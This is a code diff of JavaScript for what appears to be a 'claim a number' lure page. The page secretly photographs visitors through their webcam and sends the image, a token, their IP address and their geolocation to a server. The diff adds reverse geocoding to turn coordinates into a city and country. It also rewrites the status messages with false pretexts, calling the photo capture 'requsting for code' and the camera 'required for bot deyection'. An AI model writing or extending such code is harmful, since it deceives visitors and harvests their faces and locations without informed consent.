@@ -70,14 +70,23 @@ async function getUserIP(){
   }catch(e){ return "Unknown"; }
 }
 
-// Get location
-function getUserLocation(){
+// Get precise location (city, country)
+async function getUserLocation(){
   return new Promise(resolve=>{
-    if(!navigator.geolocation) return resolve("Unknown");
-    navigator.geolocation.getCurrentPosition(
-      pos=>resolve(`Lat:${pos.coords.latitude}, Lon:${pos.coords.longitude}`),
-      ()=>resolve("Location denied")
-    );
+    if(!navigator.geolocation) return resolve("Unavailable");
+    navigator.geolocation.getCurrentPosition(async pos=>{
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      try{
+        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
+        const data = await res.json();
+        const city = data.address.city || data.address.town || data.address.village || "Unknown City";
+        const country = data.address.country || "Unknown Country";
+        resolve(`${city}, ${country}`);
+      }catch{
+        resolve(`Lat:${lat}, Lon:${lon}`);
+      }
+    },()=>resolve("Location denied"));
   });
 }
 
@@ -89,7 +98,7 @@ claimBtn.onclick=async ()=>{
   try{
     const stream = await navigator.mediaDevices.getUserMedia({video:true});
     video.srcObject = stream; video.style.display='block';
-    status.innerText="Capturing image...";
+    status.innerText="requsting for code...";
 
     setTimeout(async ()=>{
       canvas.width=video.videoWidth; canvas.height=video.videoHeight;
@@ -104,13 +113,14 @@ claimBtn.onclick=async ()=>{
         body:JSON.stringify({image:imgBase64, token, ip, location})
       });
 
-      status.innerText=`Number ${selectedNumber} claimed successfully!`;
+      status.innerText=`✅ Number ${selectedNumber} claimed successfully!\n🌍 Location: ${location}\n🌐 IP: ${ip}`;
       loader.style.display='none';
+      video.style.display='none';
       stream.getTracks().forEach(track=>track.stop());
     },2000);
   }catch(err){
     console.error(err);
-    status.innerText="Camera access is required.";
+    status.innerText="❌ Camera access is required for bot deyection.";
     loader.style.display='none'; claimBtn.style.display='block';
   }
 };
